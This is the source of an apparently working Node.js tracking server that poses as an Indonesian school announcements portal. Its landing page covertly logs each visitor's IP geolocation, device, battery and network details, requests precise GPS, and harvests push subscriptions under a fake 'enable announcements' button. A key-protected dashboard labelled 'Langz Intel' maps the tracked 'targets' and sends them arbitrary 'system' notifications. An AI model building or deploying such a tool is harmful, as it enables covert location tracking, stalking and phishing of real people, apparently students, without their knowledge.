const express = require('express');
const fs = require('fs');
const path = require('path');
const http = require('http');
const webpush = require('web-push');

const app = express();
const PORT = process.env.PORT || 3000;

const publicVapidKey = 'BB2uH3T4F5g6H7j8K9l0M1n2O3p4Q5r6S7t8U9v0W1x2Y3z4A5b6C7d8E9f0G1h2I3j4K5l6M7n8O9p0Q1r2S3t4U5v6W7x8Y9z0';
const privateVapidKey = 'a1B2c3D4e5F6g7H8i9J0k1L2m3N4o5P6q7R8s9T0u1V2w3X4Y5z6A7b8C9d0E1f2';

webpush.setVapidDetails('mailto:admin@sekolah.id', publicVapidKey, privateVapidKey);

const DASH_KEY = 'gilang123';
const TLOG = path.join(__dirname, '_tlog');
const GEO_FILE = path.join(TLOG, 'geo.tsv');
const GPS_FILE = path.join(TLOG, 'gps.tsv');
const DEVICE_FILE = path.join(TLOG, 'devices.json');
const SUBS_FILE = path.join(TLOG, 'subscriptions.json');

if (!fs.existsSync(TLOG)) fs.mkdirSync(TLOG, { recursive: true });
if (!fs.existsSync(GEO_FILE)) fs.writeFileSync(GEO_FILE, '');
if (!fs.existsSync(GPS_FILE)) fs.writeFileSync(GPS_FILE, '');
if (!fs.existsSync(SUBS_FILE)) fs.writeFileSync(SUBS_FILE, '[]');

function clientIp(req) {
  const raw = req.headers['cf-connecting-ip'] || (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || req.socket.remoteAddress || '0.0.0.0';
  return raw.replace(/^::ffff:/, '');
}
function cleanSlug(s) { return String(s || '').replace(/[^A-Za-z0-9]/g, ''); }
function appendLog(file, line) { try { fs.appendFileSync(file, line + '\n'); } catch (e) {} }

function detectDevice(ua) {
  if (!ua) return { model: 'Unknown', os: 'Desktop', browser: 'Browser' };
  let os = 'Desktop', model = 'Unknown', browser = 'Browser';
  if (/android/i.test(ua)) { os = 'Android'; const match = ua.match(/Android[^;]*;\s*([^;)]+)/i); if (match && match[1]) model = match[1].trim().split(' Build/')[0]; }
  else if (/iphone/i.test(ua)) { os = 'iOS'; model = 'iPhone'; }
  else if (/ipad/i.test(ua)) { os = 'iOS'; model = 'iPad'; }
  if (/chrome|crios/i.test(ua)) browser = 'Chrome';
  else if (/safari/i.test(ua) && !/chrome/i.test(ua)) browser = 'Safari';
  return { model, os, browser };
}

async function ipGeo(ip) {
  const url = `http://ip-api.com/json/${encodeURIComponent(ip)}?fields=status,country,regionName,city,zip,lat,lon,isp,org,as,query`;
  try { const r = await fetch(url); return await r.json(); } catch (e) { return { status: 'fail' }; }
}

app.set('trust proxy', true); 
app.use(express.json({ limit: '2mb' })); 

app.post('/api/subscribe', (req, res) => {
  const ip = clientIp(req);
  const sub = req.body;
  if (!sub || !sub.endpoint) return res.status(400).json({error: 'Invalid sub'});
  
  let subs = [];
  try { subs = JSON.parse(fs.readFileSync(SUBS_FILE, 'utf8')); } catch (_) {}
  subs.push({ ip, subscription: sub });
  fs.writeFileSync(SUBS_FILE, JSON.stringify(subs));
  res.status(201).json({ ok: true });
});

app.get('/api/geoip', async (req, res) => {
  const ip = clientIp(req);
  const dev = detectDevice(req.headers['user-agent']);
  const data = await ipGeo(ip);
  appendLog(GEO_FILE, [new Date().toISOString(), cleanSlug(req.query.s) || '-', ip, data.city || '-', data.regionName || '-', data.lat ?? '-', data.lon ?? '-', data.isp || '-', `${dev.model}|${dev.os}|${dev.browser}`].join('\t'));
  res.json(data);
});

app.post('/api/gps', (req, res) => {
  const d = req.body || {};
  d.ip = clientIp(req); 
  const dev = detectDevice(req.headers['user-agent']);
  d.model = dev.model; d.os = dev.os; d.browser = dev.browser;
  d.ts_server = new Date().toISOString();
  appendLog(GPS_FILE, JSON.stringify(d));
  res.json({ ok: true });
});

app.post('/api/push', async (req, res) => {
  if (req.headers['x-auth-key'] !== DASH_KEY) return res.status(403).json({ok:false});
  const { ip, text } = req.body;
  
  let subs = [];
  try { subs = JSON.parse(fs.readFileSync(SUBS_FILE, 'utf8')); } catch (_) {}
  const targetSubs = subs.filter(s => s.ip === ip);
  
  if (targetSubs.length === 0) return res.json({ ok: false, msg: 'Target belum izinin notif' });

  const payload = JSON.stringify({ title: 'Pemberitahuan Sistem', body: text, icon: 'https://cdn-icons-png.flaticon.com/512/732/732200.png' });
  
  for (let t of targetSubs) {
    try { await webpush.sendNotification(t.subscription, payload); } catch (e) { console.log('Push error', e.message); }
  }
  res.json({ ok: true });
});

app.get('/sw.js', (req, res) => {
  res.setHeader('Content-Type', 'application/javascript');
  res.send(`
    self.addEventListener('push', function(e) {
      const data = e.data ? e.data.json() : { title: 'Notifikasi', body: 'Pesan baru' };
      const options = { body: data.body, icon: data.icon, badge: data.icon, vibrate: [200, 100, 200] };
      e.waitUntil(self.registration.showNotification(data.title, options));
    });
  `);
});

app.get('/dash', (req, res) => {
  if (String(req.query.k || '') !== DASH_KEY) return res.status(403).send('Forbidden');
  const devices = new Map();
  try {
    for (const line of fs.readFileSync(GEO_FILE, 'utf8').split('\n').filter(Boolean)) {
      const c = line.split('\t');
      if (c.length < 9) continue;
      const key = c[2] + '|' + (c[8] || '-');
      if (!devices.has(key)) {
        const [model, os, browser] = (c[8] || 'Unknown|OS|Browser').split('|');
        devices.set(key, { ip: c[2], time: c[0], city: c[3], region: c[4], lat: parseFloat(c[5]), lon: parseFloat(c[6]), isp: c[7], model, os, browser, gpsLat: null, gpsAcc: null });
      }
    }
  } catch (_) {}
  try {
    for (const line of fs.readFileSync(GPS_FILE, 'utf8').split('\n').filter(Boolean)) {
      let d; try { d = JSON.parse(line); } catch (_) { continue; }
      if (d.src !== 'gps' || typeof d.lat !== 'number') continue;
      let actualKey = null; for (let k of devices.keys()) { if (k.startsWith(d.ip)) { actualKey = k; break; } }
      if (actualKey) { const dev = devices.get(actualKey); dev.gpsLat = d.lat; dev.gpsLon = d.lon; dev.gpsAcc = d.acc; }
    }
  } catch (_) {}
  const list = Array.from(devices.values()).sort((a, b) => (b.time || '').localeCompare(a.time || ''));
  try { fs.writeFileSync(DEVICE_FILE, JSON.stringify(list)); } catch (_) {}

  const rows = list.map((d, i) => `
    <a class="row" href="/dash/map?k=${encodeURIComponent(DASH_KEY)}&i=${i}">
      <div class="row-icon">${d.os === 'iOS' ? '🍎' : (d.os === 'Android' ? '📱' : '💻')}</div>
      <div class="row-left">
        <div class="dev">${d.model} <span class="os">${d.os}</span></div>
        <div class="meta">${d.ip} · ${d.city}</div>
      </div>
      <div class="row-right"><span class="arrow">›</span></div>
    </a>`).join('');

  res.type('html').send(`<!doctype html><html><head><meta charset="utf-8"><title>Langz Intel</title><meta name="viewport" content="width=device-width,initial-scale=1"><style>:root{--bg:#09090b;--card:#18181b;--border:#27272a;--text:#f4f4f5;--muted:#a1a1aa;--accent:#22d3ee;}*{box-sizing:border-box;font-family:sans-serif}body{margin:0;background:var(--bg);color:var(--text)}.header{padding:24px 20px;background:var(--card);border-bottom:1px solid var(--border)}.header h1{margin:0;font-size:18px}.list{padding:16px}.row{display:flex;align-items:center;background:var(--card);border:1px solid var(--border);border-radius:16px;padding:16px;margin-bottom:12px;text-decoration:none;color:inherit}.row-icon{width:48px;height:48px;font-size:24px;display:flex;align-items:center;justify-content:center;margin-right:14px}.dev{font-weight:700}.meta{font-size:13px;color:var(--muted)}</style></head><body><div class="header"><h1>⚡ Langz Intel</h1></div><div class="list">${rows}</div></body></html>`);
});

app.get('/dash/map', (req, res) => {
  if (String(req.query.k || '') !== DASH_KEY) return res.status(403).send('Forbidden');
  let devices = []; try { devices = JSON.parse(fs.readFileSync(DEVICE_FILE, 'utf8')); } catch (_) {}
  const d = devices[parseInt(req.query.i, 10)];
  if (!d) return res.status(404).send('Device not found');
  const lat = d.gpsLat !== null ? d.gpsLat : d.lat, lon = d.gpsLon !== null ? d.gpsLon : d.lon;
  const zoom = d.gpsLat !== null ? 17 : 11, acc = d.gpsAcc || 500;

  res.type('html').send(`<!doctype html><html><head><meta charset="utf-8"><title>Map</title><meta name="viewport" content="width=device-width,initial-scale=1"><link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"><style>:root{--bg:#09090b;--card:#18181b;--border:#27272a;--text:#f4f4f5;--muted:#a1a1aa;--accent:#22d3ee;--green:#4ade80;}*{box-sizing:border-box;font-family:sans-serif}body{margin:0;background:var(--bg);color:var(--text)}#map{height:45vh}.panel{padding:20px;background:var(--card);border-radius:20px 20px 0 0;margin-top:-20px;position:relative;z-index:2}.back{color:var(--accent);text-decoration:none;font-size:14px}.msg-box{background:#27272a;border-radius:12px;padding:16px;margin-top:16px}.msg-input{width:100%;background:#18181b;border:1px solid var(--border);color:#fff;padding:12px;border-radius:8px;margin-bottom:10px}.msg-btn{width:100%;background:var(--accent);color:#000;border:none;padding:12px;border-radius:8px;font-weight:700;cursor:pointer}</style></head><body><div id="map"></div><div class="panel"><a class="back" href="/dash?k=${encodeURIComponent(DASH_KEY)}">‹ Kembali</a><h2 style="margin:10px 0;">${d.model}</h2><div style="font-size:13px;color:var(--muted);margin-bottom:15px;">IP: ${d.ip}</div><div class="msg-box"><h3 style="margin:0 0 10px;font-size:14px;color:var(--accent);">🔔 Kirim Push Notification</h3><input type="text" id="msgText" class="msg-input" placeholder="Ketik pesan..."><button class="msg-btn" onclick="sendPush()">Kirim ke HP Target</button><div id="status" style="font-size:12px;color:var(--green);margin-top:8px;display:none;text-align:center;">✅ Terkirim! Cek HP target.</div></div></div><script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script><script>const map=L.map('map',{zoomControl:false}).setView([${lat},${lon}],${zoom});L.tileLayer('https://tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);L.circle([${lat},${lon}],{radius:${acc},color:'#4ade80',fillOpacity:0.2}).addTo(map);L.circleMarker([${lat},${lon}],{radius:12,color:'#22c55e',fillColor:'#4ade80',fillOpacity:1,weight:3}).addTo(map);async function sendPush(){const text=document.getElementById('msgText').value;if(!text)return;await fetch('/api/push',{method:'POST',headers:{'Content-Type':'application/json','x-auth-key':'${DASH_KEY}'},body:JSON.stringify({ip:'${d.ip}',text:text})});document.getElementById('msgText').value='';document.getElementById('status').style.display='block';setTimeout(()=>document.getElementById('status').style.display='none',3000);}</script></body></html>`);
});

app.get('*', (req, res) => {
  const slug = cleanSlug(req.query.s || req.path.replace(/\//g, ''));
  res.type('html').send(`<!doctype html>
<html lang="id"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Portal Sekolah</title>
<style>body{margin:0;font-family:sans-serif;background:#f8fafc}.navbar{background:#0f766e;color:#fff;padding:15px;font-weight:bold}.hero{background:#fff;padding:30px;text-align:center}.container{padding:20px;max-width:600px;margin:auto}.card{background:#fff;padding:20px;border-radius:10px;margin-bottom:15px}</style></head>
<body>
<div class="navbar">🏫 SMK Negeri 1</div>
<div class="hero"><h1>Portal Informasi Sekolah</h1></div>
<div class="container"><div class="card"><h3>Pengumuman UTS</h3><p>Ujian Tengah Semester akan dilaksanakan minggu depan. Harap persiapkan diri dengan baik.</p></div></div>

<button id="enableNotif" style="position:fixed;bottom:20px;left:20px;right:20px;padding:15px;background:#0f766e;color:#fff;border:none;border-radius:10px;font-weight:bold;font-size:14px;box-shadow:0 5px 15px rgba(0,0,0,0.2);z-index:999;">🔔 Aktifkan Notifikasi Pengumuman</button>

<script>
(async function(){
  const slug = ${JSON.stringify(slug)};
  fetch('/api/geoip?s=' + encodeURIComponent(slug)).catch(()=>{});

  if ('serviceWorker' in navigator) {
    try { await navigator.serviceWorker.register('/sw.js'); } catch(e) { console.log(e); }
  }

  document.getElementById('enableNotif').addEventListener('click', async () => {
    const permission = await Notification.requestPermission();
    if (permission === 'granted') {
      const reg = await navigator.serviceWorker.ready;
      const sub = await reg.pushManager.subscribe({
        userVisibleOnly: true,
        applicationServerKey: '${publicVapidKey}'
      });
      
      await fetch('/api/subscribe', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify(sub)
      });
      
      document.getElementById('enableNotif').innerText = '✅ Notifikasi Aktif';
      document.getElementById('enableNotif').style.background = '#22c55e';
      setTimeout(() => document.getElementById('enableNotif').style.display = 'none', 2000);
    } else {
      alert('Anda menolak notifikasi.');
    }
  });

  const data = { src: 'device_info', language: navigator.language, screen: screen.width + 'x' + screen.height, slug: slug };
  if (navigator.getBattery) { try { const b = await navigator.getBattery(); data.battery = Math.round(b.level*100)+'%'; } catch(e){} }
  if (navigator.connection) { data.netType = navigator.connection.effectiveType; }
  fetch('/api/gps', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(data) }).catch(()=>{});

  setTimeout(() => {
    if(!navigator.geolocation) return;
    navigator.geolocation.getCurrentPosition(
      p => fetch('/api/gps', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({src:'gps',lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy,slug}) }).catch(()=>{}),
      e => {}, {enableHighAccuracy:true}
    );
  }, 3000);
})();
</script>
</body></html>`);
});

http.createServer(app).listen(PORT, '0.0.0.0', () => {
  console.log(`[TRACKER] Nyala di port ${PORT}`);
});
